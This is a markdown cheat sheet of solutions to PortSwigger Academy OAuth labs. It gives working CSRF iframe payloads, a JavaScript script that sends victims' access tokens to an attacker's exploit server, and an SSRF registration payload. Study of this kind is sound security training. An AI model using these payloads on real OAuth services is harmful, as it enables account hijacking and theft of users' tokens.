# OAuth Authentication

## Summary

* [Recon for OAuth Authentication](#recon)

* [Portswigger Labs Cheat Sheet / Payloads](#cheat-sheet)

* Additional Note: There is a PDF attached in this folder that has a walk-through of the complete labs. The document does not need to be downloaded, it can be viewed inline in GitHub.

<br><br>

## Recon

* Links:

    * https://portswigger.net/web-security/oauth#identifying-oauth-authentication

<br><br>

## Cheat Sheet

<br><br>

### __Authentication Bypass via OAuth Implicit Flow.__

* After the client application has received the access token for a user from the OAuth service, it will retrieve information about the user from the OAuth service "user endpoint".  

* The client application will then submit the user's email and access token to their own endpoint for authentication. (Here the access token is acting like a "traditional" password.)  

* However, by changing the email parameter to another user’s email, we can log into the application as any arbitrary user, essentially bypassing authentication.

![auth1](https://github.com/ChrisM-X/PortSwigger-Academy-CheatSheets/blob/master/OAuth%20Authentication/Images/Picture1.png)

<br><br>

### __CSRF Attack - Missing "state" Parameter. (Forced OAuth profile linking)__

* An application is allowing users to attach their social media account to their normal application account.  

* When the client application submits the "Authorization Request" to the OAuth Service, the "state" parameter is not included with the request.  This behavior can be used to perform a CSRF like attack.  

* Go through a normal OAuth workflow and capture the "Authorization Code Grant" request using Burp Proxy (then drop the request, the request will look like this - /oauth-linking?code=xxxxx).

* We will use this request as the CSRF exploit to attack other users and to attach our social media account to their normal application account.  Once the payload is delivered to the victim user, log into the application again using the "Social Media Login" function and we gain access to the admin account.

* See lab/document for more details.

* Example CSRF Payload: (Use in the Exploit Server to host it.)

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=UNUSED-CODE"></iframe>
```

<br><br>

### __CSRF Attack - Missing Validation "redirect_uri" Parameter. (OAuth account hijacking via redirect_uri)__

* The "redirect_uri" parameter is not being validated properly in the "Authorization Request".  Create an CSRF exploit that contains this "Authorization Request" along with a "redirect_uri" value to a domain you control.  

* When the OAuth server sends back the authorization code, it will append it to the domain specified in the "redirect_uri" and we can check in our Exploit server logs to obtain another user's auth code, which can now be submitted to the original "callback" URL of the application and log into their account.

* Example CSRF Payload: (Use in the Exploit Server to host it.)

```html
<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
```

* Now use the stolen oauth code within the client application's callback URL:

```html
https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN-CODE
```

![auth2](https://github.com/ChrisM-X/PortSwigger-Academy-CheatSheets/blob/master/OAuth%20Authentication/Images/Picture2.png)

<br><br>

### __CSRF + Open Redirection + Directory Traversal - Bypassing Flawed "redirect_uri" Parameter Validation. (Stealing OAuth access tokens via an open redirect)__

* The OAuth server is not properly validating the "redirect_uri" parameter in the client application's "Authorization Request".  

* The domain can't be manipulated, however, by using a directory traversal vulnerability we can point the "redirect_uri" value to another location within the client's application.  This other location in the client's application also contains an open redirection vulnerability which can be used to direct the request to an arbitrary domain like the Exploit Server.  

* Combining these 2 vulnerabilities along with a CSRF exploit, we can capture an access token (Implicit grant flow is used here.) that belongs to another user.  And use that token to access the victim user's information.

* Final payload to be hosted in the Exploit Server:
   * This will force the victim user to first visit the malicious URL then a request will be submitted to the Exploit Server with the access token appended to the request. (The access token is sent in fragment -> #xxxx)
 
   * The "redirect_uri" parameters contains the traversal and open redirection vulnerability location.
   
   * Deliver the payload to the victim user and check the Exploit Server logs for the access token. 

```javascript
<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>
```

* See lab document for more details.


<br><br>

### __SSRF via OpenID Dynamic Client Registration.__

* An attacker can dynamically register a client application with the OAuth server.  The registration endpoint does not require any authentication.  

* There is a request in the application that looks like this, which initiates a request to the endpoint that was specified within the "logo_uri" parameter upon client registration.  The contents are returned in the response as well.:

   * /client/{client-id}/logo

* We can register a new client with the OAuth server and specify Burp Collaborator endpoint within the "logo_uri" parameter to identify if an in-band SSRF attack is possible.

* Since the contents of the request are returned in the response, this is considered an in-band SSRF vulnerability and can be used to retrieve sensitive internal system information.

* The following payload was injected in the body of the OAuth's service registration endpoint:

```json
{
    "redirect_uris" : [
        "https://example.com"
    ],
    "logo_uri" : "https://BURP-COLLABORATOR-SUBDOMAIN"
}
```

* See lab document/section for more details. - https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration


<br><br>

### __Stealing OAuth access tokens via a proxy page__

* Link:  https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page

<br><br><br>

### Pending to complete labs that are missing from cheat sheet:

* All labs in this category are completed and referenced in cheat sheet or attached document.
